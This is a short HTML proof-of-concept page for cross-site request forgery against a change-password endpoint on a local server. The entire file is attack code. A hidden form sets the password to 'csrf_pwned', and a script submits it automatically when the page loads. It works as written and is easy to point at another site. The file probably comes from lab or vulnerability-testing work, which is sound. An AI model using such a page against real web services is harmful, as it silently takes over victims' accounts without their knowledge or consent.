<!-- csrf_poc.html -->
<html>
  <body>
    <form action="http://127.0.0.1:5000/change-password" method="POST">
      <input type="hidden" name="new_password" value="csrf_pwned">
    </form>
    <script>
      document.forms[0].submit();
    </script>
  </body>
</html>
